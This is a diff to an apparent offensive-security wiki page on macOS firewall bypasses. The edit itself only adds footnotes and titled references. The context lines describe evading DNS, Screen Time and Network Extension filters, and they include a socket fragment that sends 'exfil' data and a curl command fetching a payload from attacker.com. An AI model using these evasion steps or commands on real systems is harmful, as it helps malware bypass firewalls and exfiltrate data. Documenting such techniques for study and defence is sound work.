@@ -36,7 +36,7 @@ lsof -i TCP -sTCP:ESTABLISHED
 
 ### Abusing DNS
 
-DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.
+DNS resolutions are done via **`mdnsreponder`** signed application which will probably vi allowed to contact DNS servers.<sup>[1]</sup>
 
 <figure><img src="../../images/image (468).png" alt="https://www.youtube.com/watch?v=UlT5KFTMn2k"><figcaption></figcaption></figure>
 
@@ -86,7 +86,7 @@ macos-proces-abuse/
 
 ### Web content filter (Screen Time) bypass – **CVE-2024-44206**
 In July 2024 Apple patched a critical bug in Safari/WebKit that broke the system-wide “Web content filter” used by Screen Time parental controls.
-A specially crafted URI (for example, with double URL-encoded “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked by the user or an MDM profile.
+A specially crafted URI (for example, with double URL-encoded “://”) is not recognised by the Screen Time ACL but is accepted by WebKit, so the request is sent out unfiltered. Any process that can open a URL (including sandboxed or unsigned code) can therefore reach domains that are explicitly blocked by the user or an MDM profile.<sup>[2]</sup>
 
 Practical test (un-patched system):
 
@@ -108,7 +108,7 @@ sudo tcpdump -n -i en0 not port 53   # …but packets still leave the interface
 
 ### Abusing Apple-signed helper services (legacy – pre-macOS 11.2)
 Before macOS 11.2 the **`ContentFilterExclusionList`** allowed ~50 Apple binaries such as **`nsurlsessiond`** and the App Store to bypass all socket-filter firewalls implemented with the Network Extension framework (LuLu, Little Snitch, etc.).
-Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.
+Malware could simply spawn an excluded process—or inject code into it—and tunnel its own traffic over the already-allowed socket. Apple completely removed the exclusion list in macOS 11.2, but the technique is still relevant on systems that cannot be upgraded.<sup>[3]</sup>
 
 Example proof-of-concept (pre-11.2):
 
@@ -122,7 +122,7 @@ s.send(b"exfil...")
 ```
 
 ### QUIC/ECH to evade Network Extension domain filters (macOS 12+)
-NEFilter Packet/Data Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)** the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked domains without touching DNS.
+NEFilter Packet/Data Providers key off the TLS ClientHello SNI/ALPN. With **HTTP/3 over QUIC (UDP/443)** and **Encrypted Client Hello (ECH)** the SNI stays encrypted, NetExt cannot parse the flow, and hostname rules often fail-open, letting malware reach blocked domains without touching DNS.<sup>[5]</sup>
 
 Minimal PoC:
 
@@ -140,7 +140,7 @@ curl --http3-only https://attacker.com/payload
 If QUIC/ECH is still enabled this is an easy hostname-filter evasion path.
 
 ### macOS 15 “Sequoia” Network Extension instability (2024–2025)
-Early 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window for C2/exfil while the GUI still claims the firewall is running.
+Early 15.0/15.1 builds crash third‑party **Network Extension** filters (LuLu, Little Snitch, Defender, SentinelOne, etc.). When the filter restarts macOS drops its flow rules and many products fail‑open. Flooding the filter with thousands of short UDP flows (or forcing QUIC/ECH) can repeatedly trigger the crash and leave a window for C2/exfil while the GUI still claims the firewall is running.<sup>[4]</sup>
 
 Quick reproduction (safe lab box):
 
@@ -174,10 +174,10 @@ log stream --predicate 'subsystem == "com.apple.networkextension"' --style syslo
 
 ## References
 
-- [https://www.youtube.com/watch?v=UlT5KFTMn2k](https://www.youtube.com/watch?v=UlT5KFTMn2k)
-- <https://nosebeard.co/advisories/nbl-001.html>
-- <https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html>
-- <https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/>
-- <https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos>
+- [1] [DEF CON 26 - Patrick Wardle - Fire & Ice: Making and Breaking macOS Firewalls](https://www.youtube.com/watch?v=UlT5KFTMn2k)
+- [2] [Apple web content filter bypass allows unrestricted access to blocked content (CVE-2024-44206) - Nosebeard Labs](https://nosebeard.co/advisories/nbl-001.html)
+- [3] [Apple Removes macOS Feature That Allowed Apps to Bypass Firewall Security - The Hacker News](https://thehackernews.com/2021/01/apple-removes-macos-feature-that.html)
+- [4] [Cybersecurity Products Conking Out After macOS Sequoia Update - SecurityWeek](https://www.securityweek.com/cybersecurity-products-conking-out-after-macos-sequoia-update/)
+- [5] [Use network protection to help prevent macOS connections to bad sites - Microsoft Defender for Endpoint | Microsoft Learn](https://learn.microsoft.com/en-us/defender-endpoint/network-protection-macos)
 
 {{#include ../../banners/hacktricks-training.md}}
